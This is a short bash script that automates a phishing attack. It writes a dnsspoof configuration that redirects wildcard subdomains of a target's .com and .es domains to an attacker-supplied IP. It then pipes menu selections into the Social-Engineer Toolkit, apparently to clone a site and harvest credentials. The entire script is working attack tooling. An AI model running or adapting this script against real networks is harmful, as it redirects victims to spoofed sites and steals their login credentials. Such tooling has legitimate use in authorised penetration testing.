#!/bin/bash

echo "$1 *.$3.com
$1 *.$3.es" > ../cfg/dnsspoof.cfg

cd /pentest/exploits/set/

cat <<EOF | ./set
1
2
3
2
$1
$2
EOF
